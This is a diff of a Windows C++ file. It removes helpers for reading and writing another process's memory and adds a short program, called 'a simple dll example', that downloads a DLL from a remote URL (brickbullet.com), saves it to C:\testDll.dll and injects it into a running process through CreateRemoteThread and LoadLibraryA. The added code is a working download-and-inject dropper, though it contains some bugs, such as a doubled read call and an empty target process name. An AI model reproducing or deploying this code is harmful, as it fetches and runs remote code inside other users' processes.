@@ -1,243 +1,123 @@
-#pragma once
 #include <iostream>
 #include <Windows.h>
-#include <TlHelp32.h>
-#include <winternl.h>
-#include <vector>
-
+#include <string>
+#include "Shlwapi.h"
+#include "process_actions.h"
 #include "getlast_error.h"
+#include <WinInet.h>
 
+#pragma comment(lib, "Shlwapi.lib")
+#pragma comment(lib, "Wininet.lib")
 #define _CRT_SECURE_NO_WARNINGS
-
 using namespace std;
-typedef unsigned short uint;
 
-namespace PROCESS_ACTIONS {
-	template<class typeNameA>
-	class ProcActions {
-	public:
-		DWORD getProcessIDbyName(LPCSTR processName);
-		void* _ChageProtection_(LPCSTR windowProcessName, const int DESIRED_PROTECTION, int nBytes);
-		void writeCall(DWORD* callLoc, DWORD* newFuncLoc, HANDLE &handleToProcess);
-		MEMORY_BASIC_INFORMATION* _QueryProcessInfo_(LPCSTR windowProcessName, DWORD addressToQuery, HANDLE exHndl = 0);
-		bool _WriteProcMemory_(DWORD AddressToWriteTo, typeNameA InsertionValue, LPCSTR WindowName);
-		int _ReadProcMemory_(DWORD AddressToReadFrom, LPCSTR windowProcessName);
-	private:
-	};
+//A simple dll example
 
-	//Modify a call to call another function
-	template<class typeNameA>
-	void ProcActions<typename typeNameA>::writeCall(DWORD* baseAddressOfCall, DWORD* addressOfNewFunction, HANDLE& handleToProcess) {
-		
-		//Write location begins at 0xE8 + 1 Byte
-		DWORD writeLocation = (DWORD)(long)*baseAddressOfCall + 1;
-		cout << LPVOID(writeLocation) << endl;
+void GetPayload() {
+	char* fBuffer = NULL;
+	DWORD numberOfBytesRead = 0;
+	DWORD nnumberBytesWritten = 0;
 
-		//Each call: 0xE3 0x00 0x00 0x00 0x00 - is 5 bytes
-		DWORD* offset = (DWORD*)(((unsigned)*addressOfNewFunction) - ((unsigned)*baseAddressOfCall + 5));
-		cout << offset << endl;
-
-		if (WriteProcessMemory(handleToProcess, (LPVOID)writeLocation, &offset , 4, NULL) == false) {
-			std::cerr << "could not write to proc" << GetLastErrorAsString();
-			return;
-		}
-		else {
-			printf("Wrote to address: %p\n", writeLocation);
-			return;
-		}
+	//Get a handle to the useragent 
+	HINTERNET iOpen = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+	if (iOpen == NULL) {
+		std::cerr << "error could not open handle to user agent: " << GetLastErrorAsString();
 	}
-
-	//Query process information
-	template<class typeNameA>
-	MEMORY_BASIC_INFORMATION* ProcActions<typename typeNameA>::_QueryProcessInfo_(LPCSTR windowProcesName, DWORD addressToQuery, HANDLE exHndl) {
-		DWORD ProcessID;
-		MEMORY_BASIC_INFORMATION mbi;
-		std::string updatedProtection;
-
-		//Get a handle to the window
-		HWND handleToWindow = FindWindowA(NULL, windowProcesName);
-		if (handleToWindow == NULL) {
-			cerr << "Error --- Could not find window: " << GetLastErrorAsString() << endl;
-			return false;
+	else {
+		//if using not relative url use InternetCanonicalizeUrl
+		HINTERNET iRsrc = InternetOpenUrlA(iOpen, "http://brickbullet.com/rmtsrc/testdll.dll", 0, 0, INTERNET_FLAG_RELOAD, 0);
+		if (iOpen == NULL) {
+			std::cerr << "could not access resource: " << GetLastErrorAsString();
 		}
 		else {
-			//Get thread PID and Handle to process
-			int threadID = GetWindowThreadProcessId(handleToWindow, &ProcessID);
-			HANDLE toProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, ProcessID);
-
-			//Query the process and format output
-			VirtualQueryEx(toProc, (void*)addressToQuery, &mbi, sizeof(mbi));
-
-			printf("====== PROCESS INFO =====\n");
-			printf("Process name: %s\n\n", windowProcesName);
-			printf("Base address: %p\n", mbi.BaseAddress);
-			printf("Allocation base: %p\n", mbi.AllocationBase);
-			printf("Allocation protect: %d\n", mbi.AllocationProtect);
-			printf("Region size: %d\n", mbi.RegionSize);
-			printf("State: 0x%08x\n", mbi.State);
-			printf("Protect: 0x%08x\n", mbi.Protect);
-			printf("Type: 0x%08x\n", mbi.Type);
-
-			//Get last error and close handle
-			std::cout << GetLastErrorAsString();
-			CloseHandle(toProc);
-			return &mbi;
-		}
-	}
-
-
-	//Read from memory
-	template<class typeNameA>
-	int ProcActions<typename typeNameA>::_ReadProcMemory_(DWORD addressToReadFrom, LPCSTR windowProcessName) {
-
-		//Get a handle to the window
-		HWND handleToWindow = FindWindowA(NULL, windowProcessName);
-		if (handleToWindow == NULL) {
-			cerr << "Error --- Could not find window: " << GetLastErrorAsString() << endl;
-			return false;
-		}
-		else {
-			DWORD processID;
-			int readBuffer = 0;
-
-			//get the thread PID assoicated with the window
-			DWORD threadProcessID = GetWindowThreadProcessId(handleToWindow, &processID);
-
-			//get a handle to the process with all access rights
-			HANDLE hndlToOpenProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
-			if (hndlToOpenProc == NULL) {
-				cerr << "Error -- Could not Open this process" << GetLastErrorAsString() << endl;
+			//create empty file on disk
+			HANDLE hOut = CreateFile(L"C:\\testDll.dll", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (hOut == INVALID_HANDLE_VALUE) {
+				cerr << "could not create file: " << GetLastErrorAsString() << endl;
 			}
 			else {
-				bool read = ReadProcessMemory(hndlToOpenProc, (LPVOID)addressToReadFrom, &readBuffer, sizeof(readBuffer), 0);
-				if (read == true) {
-					printf("Successfully read value: %d at location: %p\n", readBuffer, (void*)addressToReadFrom);
-				}
-				else {
-					cerr << "Failed to write memory." << GetLastErrorAsString() << endl;
-					return 0;
-				}
+				do {
+					fBuffer = new char[2000];
+					ZeroMemory(fBuffer, 2000);
+					//read the file from the url
+					InternetReadFile(iRsrc, (LPVOID)fBuffer, 2000, &numberOfBytesRead);
+					if (!(InternetReadFile(iRsrc, (LPVOID)fBuffer, 2000, &numberOfBytesRead))) {
+						cerr << "error could not read from the file: " << GetLastErrorAsString();
+					}
+					else {
+						//write to the file 
+						if (!(WriteFile(hOut, &fBuffer[0], numberOfBytesRead, &nnumberBytesWritten, NULL))) {
+							cerr << "could not write the file" << GetLastErrorAsString();
+						}
+					}
+					//clean up free memory and close handles
+					delete[] fBuffer;
+					fBuffer = NULL;
+				} while (numberOfBytesRead);
+				CloseHandle(hOut);
 			}
-			return readBuffer;
+			InternetCloseHandle(iOpen);
+			InternetCloseHandle(iRsrc);
 		}
 	}
+	return;
+}
 
-	template<class typeNameA>
-	void* ProcActions<typename typeNameA>::_ChageProtection_(LPCSTR windowProcessName, const int DESIRED_PROTECTION, int nBytes) {
-		DWORD procID;
-		DWORD oldProtect;
-		MEMORY_BASIC_INFORMATION mbi;
+int executePayload() {
+	WIN32_FIND_DATAA fdata;
+	HANDLE findFile = FindFirstFileA("C:\\testDll.dll", &fdata);
 
-		//Find the window and return the hadle to the window
-		HWND handleToWindow = FindWindowA(NULL, windowProcessName);
-		if (handleToWindow == NULL) { cerr << "Error --- Could not find window: " << GetLastErrorAsString() << endl; exit(1); }
-
-		//Get the thread process ID of the window and open a handle to the process
-		DWORD threadProcessID = GetWindowThreadProcessId(handleToWindow, &procID);
-		HANDLE hndlToOpenProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);
-
-		//Allocate memory in the remote processes address space (1 page) and make query to the updated protection 
-		LPVOID lpbase = VirtualAllocEx(hndlToOpenProc, NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-		VirtualQueryEx(hndlToOpenProc, lpbase, &mbi, sizeof(mbi));
-		printf("Old protection: 0x%08x\n", mbi.Protect);
-
-		//change protection on pages in processes virtual address space
-		if (VirtualProtectEx(hndlToOpenProc, lpbase, nBytes, DESIRED_PROTECTION, &oldProtect) != NULL) {
-			VirtualQueryEx(hndlToOpenProc, lpbase, &mbi, sizeof(mbi));
-			printf("Updated Protection at : 0x%08x : Updated protection : 0x%08x", lpbase, mbi.Protect);
-			return lpbase;
-		}
-		else {
-			cerr << "Could not update protection!" << endl;
-			CloseHandle(hndlToOpenProc);
-			exit(EXIT_FAILURE);
-		}
+	if (findFile == INVALID_HANDLE_VALUE) {
+		cerr << "Could not find fild data" << GetLastErrorAsString();
 	}
+	else {
+		std::string pname, dllpath;
+		PROCESS_ACTIONS::ProcActions<DWORD> obj;
 
-
-	template<class typeNameA>
-	bool ProcActions<typename typeNameA>::_WriteProcMemory_(DWORD AddressToWriteTo, typeNameA InsertionValue, LPCSTR windowProcessName) {
-		//Get a handle to the window
-		HWND handleToWindow = FindWindowA(NULL, windowProcessName);
-		if (handleToWindow == NULL) {
-			cerr << "Error --- Could not find window: " << GetLastErrorAsString() << endl;
-			return false;
+		const char* p = ""; const char* d = "C:\\testDll.dll";
+		if (obj.getProcessIDbyName(p) == 0) {
+			cerr << "[ERROR] The process specified was not found." << std::endl;
+			
+		}
+		//Check if the path to the file exists
+		if (!PathFileExistsA(d)) {
+			cerr << "\n[ERROR] Invalid file path specified." << endl;
 		}
 		else {
-			DWORD processID;
-
-			//get the threadID of the process
-			DWORD threadProcessID = GetWindowThreadProcessId(handleToWindow, &processID);
-
-			//Open handle to the process
-			HANDLE hndlToOpenProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
-			if (hndlToOpenProc == NULL) {
-				cerr << "Error -- Could not Open this process" << GetLastErrorAsString() << endl;
-				return false;
+			//open a handle to the target process
+			HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, obj.getProcessIDbyName(p));
+			if (hProcess == NULL) {
+				cerr << "Could not open process" << GetLastErrorAsString();
 			}
 			else {
-				bool write = WriteProcessMemory(hndlToOpenProc, (LPVOID)AddressToWriteTo, &InsertionValue, sizeof(InsertionValue), 0);
-				if (write == true) {
-					printf("Successfully wrote Value: %d at Location: %p\n", InsertionValue, (void*)AddressToWriteTo);
-					return true;
+				//allocate memory in process, save base address
+				LPVOID dllP = VirtualAllocEx(hProcess, 0, strlen(d) + 1, MEM_COMMIT, PAGE_READWRITE);
+				if (dllP == NULL) {
+					cerr << "Failed to allocate memory in process. " << GetLastErrorAsString() << endl;
 				}
 				else {
-					cerr << "Failed to write memory." << GetLastErrorAsString() << endl;
-					return false;
+					//write the path to the region allocated
+					WriteProcessMemory(hProcess, dllP, (LPVOID)d, strlen(d) + 1, 0);
+					HANDLE handleLthd = CreateRemoteThread(hProcess, 0, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), dllP, 0, 0);
+					DWORD retVal = WaitForSingleObject(handleLthd, INFINITE);
+					if (handleLthd == NULL | retVal == WAIT_FAILED) {
+						cerr << "Failed to create remote thread in process." << endl;
+						return -1;
+					}
+					printf("Path allocation address:  0x%08x\n", dllP);
+					VirtualFreeEx(hProcess, dllP, strlen(d) + 1, MEM_RELEASE);
 				}
 			}
 		}
-		return true;
+		CloseHandle(findFile);
 	}
+	return 0;
+}
 
-	//get the PID by name
-	template<class typeNameA>
-	DWORD ProcActions<typename typeNameA>::getProcessIDbyName(LPCSTR processName) {
-		bool fFlag = false;
-		DWORD processID;
-		PROCESSENTRY32W PE;
-		std::string retStr;
 
-		//Take a snapshot of all processes in system
-		HANDLE snapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
-		if (snapShot == INVALID_HANDLE_VALUE) {
-			cerr << "Error: " << GetLastErrorAsString();
-		}
-
-		//Set szie of process entry;
-		PE.dwSize = sizeof(PROCESSENTRY32);
-
-		//Retrieves information about first process captured by snapshot(CreateToolhelp32SnapShot)
-		if (Process32First(snapShot, &PE)) {
-			//get the size of the string including the null character (-1 FLAG)
-			int sizeRequired = WideCharToMultiByte(CP_UTF8, 0, PE.szExeFile, -1, NULL, 0, NULL, NULL);
-			while (Process32Next(snapShot, &PE) != 0) {
-				std::vector<char> utf8String(sizeRequired);
-
-				//Convert UTF-16 to UFT-8
-				int bytesConvert = WideCharToMultiByte(CP_UTF8, 0, PE.szExeFile, -1, &utf8String[0], utf8String.size(), NULL, NULL);
-				retStr = &utf8String[0];
-
-				//Convert a std::string to const char*
-				const char* c = retStr.c_str();
-
-				//Compare each entity in the process list
-				if (strcmp(processName, c) == 0) {
-					fFlag = true;
-					//cout << "Process name: " << c << '\n';
-					//cout << "Process ID: " << PE.th32ProcessID << '\n';
-					return PE.th32ProcessID;
-				}
-			}
-			if (fFlag == false) {
-				cerr << "Error: could not find process - \n";
-				return 0;
-			}
-		}
-		//close handle and return the pid
-		if (snapShot != 0) {
-			CloseHandle(snapShot);
-			return PE.th32ProcessID;
-		}
-	}
+int main(int argc, char* argv[])
+{
+	GetPayload();
+	executePayload();
+	return 0;
 }
